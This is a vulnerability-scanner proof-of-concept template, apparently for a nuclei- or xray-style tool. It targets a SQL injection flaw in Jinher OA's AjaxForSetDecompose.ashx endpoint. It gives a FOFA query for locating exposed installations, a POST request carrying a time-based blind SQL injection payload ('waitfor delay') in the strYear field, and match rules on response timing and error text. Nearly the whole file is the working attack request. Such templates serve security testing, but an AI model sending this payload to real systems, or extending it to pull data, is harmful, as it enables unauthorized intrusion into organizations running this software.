id: poc-yaml-jinher-jhsoft-ajaxforsetdecompose-ashx-sqli
info:
  name: 金和OA AjaxForSetDecompose.ashx SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 金和OA
  fofa: app="金和网络-金和OA"
variables:
  t1: random_int(5,10)
  t2: t1 + t1
  t3: t2 + 2
requests:
- method: POST
  path: /c6/JHSoft.Web.CostControl/Decompose/AjaxForSetDecompose.ashx
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: strType=getDetpCollect&strYear=1;waitfor+delay%270:0:{{.t1}}%27--
  expression: 'status_code == 500 &&

    contains(gbk_decode(body),"未能找到路径") &&

    contains(body,"JHSoft") &&

    contains(body,"System.IO") &&

    duration >= t2 &&

    duration <= t3

    '
transport: http
